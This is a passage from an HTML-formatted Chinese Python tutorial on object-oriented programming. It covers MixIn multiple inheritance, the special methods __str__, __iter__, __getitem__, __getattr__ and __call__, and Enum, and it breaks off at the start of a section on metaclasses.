print(&#x27;Running...&#x27;)</span><br><span class="line"></span><br><span class="line">class Flyable(object):</span><br><span class="line">    def fly(self):</span><br><span class="line">        print(&#x27;Flying...&#x27;)</span><br></pre></td></tr></table></figure><p>对于需要<code>Runnable</code>功能的动物，就多继承一个<code>Runnable</code>，例如<code>Dog</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class Dog(Mammal, Runnable):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>对于需要<code>Flyable</code>功能的动物，就多继承一个<code>Flyable</code>，例如<code>Bat</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class Bat(Mammal, Flyable):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>通过多重继承，一个子类就可以同时获得多个父类的所有功能。</p><h3 id="7-3-1-MixIn"><a href="#7-3-1-MixIn" class="headerlink" title="7.3.1 MixIn"></a>7.3.1 MixIn</h3><p>在设计类的继承关系时，通常，主线都是单一继承下来的，例如，<code>Ostrich</code>继承自<code>Bird</code>。但是，如果需要“混入”额外的功能，通过多重继承就可以实现，比如，让<code>Ostrich</code>除了继承自<code>Bird</code>外，再同时继承<code>Runnable</code>。这种设计通常称之为 MixIn。</p><p>为了更好地看出继承关系，我们把<code>Runnable</code>和<code>Flyable</code>改为<code>RunnableMixIn</code>和<code>FlyableMixIn</code>。类似的，你还可以定义出肉食动物<code>CarnivorousMixIn</code>和植食动物<code>HerbivoresMixIn</code>，让某个动物同时拥有好几个 MixIn：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class Dog(Mammal, RunnableMixIn, CarnivorousMixIn):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>MixIn 的目的就是给一个类增加多个功能，这样，在设计类的时候，我们优先考虑通过多重继承来组合多个 MixIn 的功能，而不是设计多层次的复杂的继承关系。</p><p>Python 自带的很多库也使用了 MixIn。举个例子， Python 自带了<code>TCPServer</code>和<code>UDPServer</code>这两类网络服务，而要同时服务多个用户就必须使用多进程或多线程模型，这两种模型由<code>ForkingMixIn</code>和<code>ThreadingMixIn</code>提供。通过组合，我们就可以创造出合适的服务来。</p><p>比如，编写一个多进程模式的 TCP 服务，定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class MyTCPServer(TCPServer, ForkingMixIn):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>编写一个多线程模式的 UDP 服务，定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class MyUDPServer(UDPServer, ThreadingMixIn):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>如果你打算搞一个更先进的协程模型，可以编写一个<code>CoroutineMixIn</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class MyTCPServer(TCPServer, CoroutineMixIn):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>这样一来，我们不需要复杂而庞大的继承链，只要选择组合不同的类的功能，就可以快速构造出所需的子类。</p><blockquote><p>小结：</p></blockquote><p>由于 Python 允许使用多重继承，因此，MixIn 就是一种常见的设计。</p><p>只允许单一继承的语言（如 Java）不能使用 MixIn 的设计。</p><h2 id="7-4-定制类"><a href="#7-4-定制类" class="headerlink" title="7.4 定制类"></a>7.4 定制类</h2><p>看到类似<code>__slots__</code>这种形如<code>__xxx__</code>的变量或者函数名就要注意，这些在 Python 中是有特殊用途的。</p><p><code>__slots__</code>我们已经知道怎么用了，<code>__len__()</code>方法我们也知道是为了能让 class 作用于<code>len()</code>函数。</p><p>除此之外，Python 的 class 中还有许多这样有特殊用途的函数，可以帮助我们定制类。</p><h3 id="7-4-1-str"><a href="#7-4-1-str" class="headerlink" title="7.4.1 __str__"></a>7.4.1 <code>__str__</code></h3><p>我们先定义一个<code>Student</code>类，打印一个实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class Student(object):</span><br><span class="line">...     def __init__(self, name):</span><br><span class="line">...         self.name = name</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; print(Student(&#x27;Michael&#x27;))</span><br><span class="line">&lt;__main__.Student object at 0x109afb190&gt;</span><br></pre></td></tr></table></figure><p>打印出一堆<code>&lt;__main__.Student object at 0x109afb190&gt;</code>，不好看。</p><p>怎么才能打印得好看呢？只需要定义好<code>__str__()</code>方法，返回一个好看的字符串就可以了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class Student(object):</span><br><span class="line">...     def __init__(self, name):</span><br><span class="line">...         self.name = name</span><br><span class="line">...     def __str__(self):</span><br><span class="line">...         return &#x27;Student object (name: %s)&#x27; % self.name</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; print(Student(&#x27;Michael&#x27;))</span><br><span class="line">Student object (name: Michael)</span><br></pre></td></tr></table></figure><p>这样打印出来的实例，不但好看，而且容易看出实例内部重要的数据。</p><p>但是细心的朋友会发现直接敲变量不用<code>print</code>，打印出来的实例还是不好看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = Student(&#x27;Michael&#x27;)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&lt;__main__.Student object at 0x109afb310&gt;</span><br></pre></td></tr></table></figure><p>这是因为直接显示变量调用的不是<code>__str__()</code>，而是<code>__repr__()</code>，两者的区别是<code>__str__()</code>返回用户看到的字符串，而<code>__repr__()</code>返回程序开发者看到的字符串，也就是说，<code>__repr__()</code>是为调试服务的。</p><p>解决办法是再定义一个<code>__repr__()</code>。但是通常<code>__str__()</code>和<code>__repr__()</code>代码都是一样的，所以，有个偷懒的写法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        self.name = name</span><br><span class="line">    def __str__(self):</span><br><span class="line">        return &#x27;Student object (name=%s)&#x27; % self.name</span><br><span class="line">    __repr__ = __str__</span><br></pre></td></tr></table></figure><h3 id="7-4-2-iter"><a href="#7-4-2-iter" class="headerlink" title="7.4.2 __iter__"></a>7.4.2 <code>__iter__</code></h3><p>如果一个类想被用于<code>for ... in</code>循环，类似 list 或 tuple 那样，就必须实现一个<code>__iter__()</code>方法，该方法返回一个迭代对象，然后，Python 的 for 循环就会不断调用该迭代对象的<code>__next__()</code>方法拿到循环的下一个值，直到遇到<code>StopIteration</code>错误时退出循环。</p><p>我们以斐波那契数列为例，写一个 Fib 类，可以作用于 for 循环：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Fib(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.a, self.b = 0, 1 # 初始化两个计数器a，b</span><br><span class="line"></span><br><span class="line">    def __iter__(self):</span><br><span class="line">        return self # 实例本身就是迭代对象，故返回自己</span><br><span class="line"></span><br><span class="line">    def __next__(self):</span><br><span class="line">        self.a, self.b = self.b, self.a + self.b # 计算下一个值</span><br><span class="line">        if self.a &gt; 100000: # 退出循环的条件</span><br><span class="line">            raise StopIteration()</span><br><span class="line">        return self.a # 返回下一个值</span><br></pre></td></tr></table></figure><p>现在，试试把 Fib 实例作用于 for 循环：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for n in Fib():</span><br><span class="line">    print(n)</span><br></pre></td></tr></table></figure><h3 id="7-4-3-getitem"><a href="#7-4-3-getitem" class="headerlink" title="7.4.3 __getitem__"></a>7.4.3 <code>__getitem__</code></h3><p>Fib实例虽然能作用于 for 循环，看起来和 list 有点像，但是，把它当成 list 来使用还是不行，比如，取第 5 个元素：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; Fib()[5]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: &#x27;Fib&#x27; object does not support indexing</span><br></pre></td></tr></table></figure><p>要表现得像 list 那样按照下标取出元素，需要实现<code>__getitem__()</code>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Fib(object):</span><br><span class="line">    def __getitem__(self, n):</span><br><span class="line">        a, b = 1, 1</span><br><span class="line">        for x in range(n):</span><br><span class="line">            a, b = b, a + b</span><br><span class="line">        return a</span><br></pre></td></tr></table></figure><p>现在，就可以按下标访问数列的任意一项了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = Fib()</span><br><span class="line">&gt;&gt;&gt; f[0]</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; f[1]</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; f[2]</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; f[3]</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; f[10]</span><br><span class="line">89</span><br><span class="line">&gt;&gt;&gt; f[100]</span><br><span class="line">573147844013817084101</span><br></pre></td></tr></table></figure><p>但是 list 有个神奇的切片方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(range(100))[5:10]</span><br><span class="line">[5, 6, 7, 8, 9]</span><br></pre></td></tr></table></figure><p>对于 Fib 却报错。原因是<code>__getitem__()</code>传入的参数可能是一个 int，也可能是一个切片对象<code>slice</code>，所以要做判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class Fib(object):</span><br><span class="line">    def __getitem__(self, n):</span><br><span class="line">        if isinstance(n, int): # n是索引</span><br><span class="line">            a, b = 1, 1</span><br><span class="line">            for x in range(n):</span><br><span class="line">                a, b = b, a + b</span><br><span class="line">            return a</span><br><span class="line">        if isinstance(n, slice): # n是切片</span><br><span class="line">            start = n.start</span><br><span class="line">            stop = n.stop</span><br><span class="line">            if start is None:</span><br><span class="line">                start = 0</span><br><span class="line">            a, b = 1, 1</span><br><span class="line">            L = []</span><br><span class="line">            for x in range(stop):</span><br><span class="line">                if x &gt;= start:</span><br><span class="line">                    L.append(a)</span><br><span class="line">                a, b = b, a + b</span><br><span class="line">            return L</span><br></pre></td></tr></table></figure><p>现在试试 Fib 的切片：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = Fib()</span><br><span class="line">&gt;&gt;&gt; f[0:5]</span><br><span class="line">[1, 1, 2, 3, 5]</span><br><span class="line">&gt;&gt;&gt; f[:10]</span><br><span class="line">[1, 1, 2, 3, 5, 8, 13, 21, 34, 55]</span><br></pre></td></tr></table></figure><p>但是没有对 step 参数作处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f[:10:2]</span><br><span class="line">[1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89]</span><br></pre></td></tr></table></figure><p>也没有对负数作处理，所以，要正确实现一个<code>__getitem__()</code>还是有很多工作要做的。</p><p>此外，如果把对象看成<code>dict</code>，<code>__getitem__()</code>的参数也可能是一个可以作 key 的 object，例如<code>str</code>。</p><p>与之对应的是<code>__setitem__()</code>方法，把对象视作 list 或 dict 来对集合赋值。最后，还有一个<code>__delitem__()</code>方法，用于删除某个元素。</p><p>总之，通过上面的方法，我们自己定义的类表现得和 Python 自带的 list、tuple、dict 没什么区别，这完全归功于动态语言的“鸭子类型”，不需要强制继承某个接口。</p><h3 id="7-4-4-getattr"><a href="#7-4-4-getattr" class="headerlink" title="7.4.4 __getattr__"></a>7.4.4 <code>__getattr__</code></h3><p>正常情况下，当我们调用类的方法或属性时，如果不存在，就会报错。比如定义<code>Student</code>类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    </span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.name = &#x27;Michael&#x27;</span><br></pre></td></tr></table></figure><p>调用<code>name</code>属性，没问题，但是，调用不存在的<code>score</code>属性，就有问题了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = Student()</span><br><span class="line">&gt;&gt;&gt; print(s.name)</span><br><span class="line">Michael</span><br><span class="line">&gt;&gt;&gt; print(s.score)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">AttributeError: &#x27;Student&#x27; object has no attribute &#x27;score&#x27;</span><br></pre></td></tr></table></figure><p>错误信息很清楚地告诉我们，没有找到<code>score</code>这个 attribute。</p><p>要避免这个错误，除了可以加上一个<code>score</code>属性外，Python 还有另一个机制，那就是写一个<code>__getattr__()</code>方法，动态返回一个属性。修改如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.name = &#x27;Michael&#x27;</span><br><span class="line"></span><br><span class="line">    def __getattr__(self, attr):</span><br><span class="line">        if attr==&#x27;score&#x27;:</span><br><span class="line">            return 99</span><br></pre></td></tr></table></figure><p>当调用不存在的属性时，比如<code>score</code>，Python 解释器会试图调用<code>__getattr__(self, &#39;score&#39;)</code>来尝试获得属性，这样，我们就有机会返回<code>score</code>的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = Student()</span><br><span class="line">&gt;&gt;&gt; s.name</span><br><span class="line">&#x27;Michael&#x27;</span><br><span class="line">&gt;&gt;&gt; s.score</span><br><span class="line">99</span><br></pre></td></tr></table></figure><p>返回函数也是完全可以的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    def __getattr__(self, attr):</span><br><span class="line">        if attr==&#x27;age&#x27;:</span><br><span class="line">            return lambda: 25</span><br></pre></td></tr></table></figure><p>只是调用方式要变为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.age()</span><br><span class="line">25</span><br></pre></td></tr></table></figure><p>注意，只有在没有找到属性的情况下，才调用<code>__getattr__</code>，已有的属性，比如<code>name</code>，不会在<code>__getattr__</code>中查找。</p><p>此外，注意到任意调用如<code>s.abc</code>都会返回<code>None</code>，这是因为我们定义的<code>__getattr__</code>默认返回就是<code>None</code>。要让 class 只响应特定的几个属性，我们就要按照约定，抛出<code>AttributeError</code>的错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    def __getattr__(self, attr):</span><br><span class="line">        if attr==&#x27;age&#x27;:</span><br><span class="line">            return lambda: 25</span><br><span class="line">        raise AttributeError(&#x27;\&#x27;Student\&#x27; object has no attribute \&#x27;%s\&#x27;&#x27; % attr)</span><br></pre></td></tr></table></figure><p>这实际上可以把一个类的所有属性和方法调用全部动态化处理了，不需要任何特殊手段。</p><p>这种完全动态调用的特性有什么实际作用呢？作用就是，可以针对完全动态的情况作调用。</p><p>举个例子：</p><p>现在很多网站都搞 REST API，比如新浪微博、豆瓣啥的，调用 API 的 URL 类似：</p><ul><li><a href="http://api.server/user/friends">http://api.server/user/friends</a></li><li><a href="http://api.server/user/timeline/list">http://api.server/user/timeline/list</a></li></ul><p>如果要写 SDK，给每个 URL 对应的 API 都写一个方法，那得累死，而且，API 一旦改动，SDK 也要改。</p><p>利用完全动态的<code>__getattr__</code>，我们可以写出一个链式调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Chain(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, path=&#x27;&#x27;):</span><br><span class="line">        self._path = path</span><br><span class="line"></span><br><span class="line">    def __getattr__(self, path):</span><br><span class="line">        return Chain(&#x27;%s/%s&#x27; % (self._path, path))</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return self._path</span><br><span class="line"></span><br><span class="line">    __repr__ = __str__</span><br></pre></td></tr></table></figure><p>试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; Chain().status.user.timeline.list</span><br><span class="line">&#x27;/status/user/timeline/list&#x27;</span><br></pre></td></tr></table></figure><p>这样，无论 API 怎么变，SDK 都可以根据 URL 实现完全动态的调用，而且，不随 API 的增加而改变！</p><p>还有些 REST API 会把参数放到 URL 中，比如 GitHub 的 API：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /users/:user/repos</span><br></pre></td></tr></table></figure><p>调用时，需要把<code>:user</code>替换为实际用户名。如果我们能写出这样的链式调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Chain().users(&#x27;michael&#x27;).repos</span><br></pre></td></tr></table></figure><p>就可以非常方便地调用 API 了。有兴趣的童鞋可以试试写出来。</p><h3 id="7-4-5-call"><a href="#7-4-5-call" class="headerlink" title="7.4.5 __call__"></a>7.4.5 <code>__call__</code></h3><p>一个对象实例可以有自己的属性和方法，当我们调用实例方法时，我们用<code>instance.method()</code>来调用。能不能直接在实例本身上调用呢？在 Python 中，答案是肯定的。</p><p>任何类，只需要定义一个<code>__call__()</code>方法，就可以直接对实例进行调用。请看示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    def __call__(self):</span><br><span class="line">        print(&#x27;My name is %s.&#x27; % self.name)</span><br></pre></td></tr></table></figure><p>调用方式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = Student(&#x27;Michael&#x27;)</span><br><span class="line">&gt;&gt;&gt; s() # self参数不要传入</span><br><span class="line">My name is Michael.</span><br></pre></td></tr></table></figure><p><code>__call__()</code>还可以定义参数。对实例进行直接调用就好比对一个函数进行调用一样，所以你完全可以把对象看成函数，把函数看成对象，因为这两者之间本来就没啥根本的区别。</p><p>如果你把对象看成函数，那么函数本身其实也可以在运行期动态创建出来，因为类的实例都是运行期创建出来的，这么一来，我们就模糊了对象和函数的界限。</p><p>那么，怎么判断一个变量是对象还是函数呢？其实，更多的时候，我们需要判断一个对象是否能被调用，能被调用的对象就是一个<code>Callable</code>对象，比如函数和我们上面定义的带有<code>__call__()</code>的类实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; callable(Student())</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; callable(max)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; callable([1, 2, 3])</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; callable(None)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; callable(&#x27;str&#x27;)</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>通过<code>callable()</code>函数，我们就可以判断一个对象是否是“可调用”对象。</p><blockquote><p>小结：</p></blockquote><ul><li>Python 的 class 允许定义许多定制方法，可以让我们非常方便地生成特定的类。</li><li>本节介绍的是最常用的几个定制方法，还有很多可定制的方法，请参考<a href="http://docs.python.org/3/reference/datamodel.html#special-method-names">Python的官方文档</a>。</li></ul><h2 id="7-5-使用枚举类"><a href="#7-5-使用枚举类" class="headerlink" title="7.5 使用枚举类"></a>7.5 使用枚举类</h2><p>当我们需要定义常量时，一个办法是用大写变量通过整数来定义，例如月份：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JAN = 1</span><br><span class="line">FEB = 2</span><br><span class="line">MAR = 3</span><br><span class="line">...</span><br><span class="line">NOV = 11</span><br><span class="line">DEC = 12</span><br></pre></td></tr></table></figure><p>好处是简单，缺点是类型是<code>int</code>，并且仍然是变量。</p><p>更好的方法是为这样的枚举类型定义一个 class 类型，然后，每个常量都是 class 的一个唯一实例。Python 提供了<code>Enum</code>类来实现这个功能：</p><h3 id="7-5-1-Enum"><a href="#7-5-1-Enum" class="headerlink" title="7.5.1 Enum"></a>7.5.1 Enum</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from enum import Enum</span><br><span class="line"></span><br><span class="line">Month = Enum(&#x27;Month&#x27;, (&#x27;Jan&#x27;, &#x27;Feb&#x27;, &#x27;Mar&#x27;, &#x27;Apr&#x27;, &#x27;May&#x27;, &#x27;Jun&#x27;, &#x27;Jul&#x27;, &#x27;Aug&#x27;, &#x27;Sep&#x27;, &#x27;Oct&#x27;, &#x27;Nov&#x27;, &#x27;Dec&#x27;))</span><br></pre></td></tr></table></figure><p>这样我们就获得了<code>Month</code>类型的枚举类，可以直接使用<code>Month.Jan</code>来引用一个常量，或者枚举它的所有成员：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for name, member in Month.__members__.items():</span><br><span class="line">    print(name, &#x27;=&gt;&#x27;, member, &#x27;,&#x27;, member.value)</span><br></pre></td></tr></table></figure><p><code>value</code>属性则是自动赋给成员的<code>int</code>常量，默认从<code>1</code>开始计数。</p><p>如果需要更精确地控制枚举类型，可以从<code>Enum</code>派生出自定义类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from enum import Enum, unique</span><br><span class="line"></span><br><span class="line">@unique</span><br><span class="line">class Weekday(Enum):</span><br><span class="line">    Sun = 0 # Sun的value被设定为0</span><br><span class="line">    Mon = 1</span><br><span class="line">    Tue = 2</span><br><span class="line">    Wed = 3</span><br><span class="line">    Thu = 4</span><br><span class="line">    Fri = 5</span><br><span class="line">    Sat = 6</span><br></pre></td></tr></table></figure><p><code>@unique</code>装饰器可以帮助我们检查保证没有重复值。</p><p>访问这些枚举类型可以有若干种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; day1 = Weekday.Mon</span><br><span class="line">&gt;&gt;&gt; print(day1)</span><br><span class="line">Weekday.Mon</span><br><span class="line">&gt;&gt;&gt; print(Weekday.Tue)</span><br><span class="line">Weekday.Tue</span><br><span class="line">&gt;&gt;&gt; print(Weekday[&#x27;Tue&#x27;])</span><br><span class="line">Weekday.Tue</span><br><span class="line">&gt;&gt;&gt; print(Weekday.Tue.value)</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; print(day1 == Weekday.Mon)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; print(day1 == Weekday.Tue)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; print(Weekday(1))</span><br><span class="line">Weekday.Mon</span><br><span class="line">&gt;&gt;&gt; print(day1 == Weekday(1))</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; Weekday(7)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">ValueError: 7 is not a valid Weekday</span><br><span class="line">&gt;&gt;&gt; for name, member in Weekday.__members__.items():</span><br><span class="line">...     print(name, &#x27;=&gt;&#x27;, member)</span><br><span class="line">...</span><br><span class="line">Sun =&gt; Weekday.Sun</span><br><span class="line">Mon =&gt; Weekday.Mon</span><br><span class="line">Tue =&gt; Weekday.Tue</span><br><span class="line">Wed =&gt; Weekday.Wed</span><br><span class="line">Thu =&gt; Weekday.Thu</span><br><span class="line">Fri =&gt; Weekday.Fri</span><br><span class="line">Sat =&gt; Weekday.Sat</span><br></pre></td></tr></table></figure><p>可见，既可以用成员名称引用枚举常量，又可以直接根据value的值获得枚举常量。</p><h2 id="7-6-使用元类"><a href="#7-6-使用元类" class="headerlink" title="7.6 使用元类"></a>7.6 使用元类</h2><h3 id="7-6-1-type"><a href="#7-6-1-type" class="headerlink" title="7.6.1 type()"></a>7.6.1 type()</h3><p>动态语言和静态语言最大的不同，就是函数和类的定义，不是编译时定义的，而是运行时动态创建的。</p><p>比方说我们要定义一个<code>Hello</code>的 class，就写一个<code>hello.py</code>模块：</p><figure class="highlight plaintext"><table><tr><td 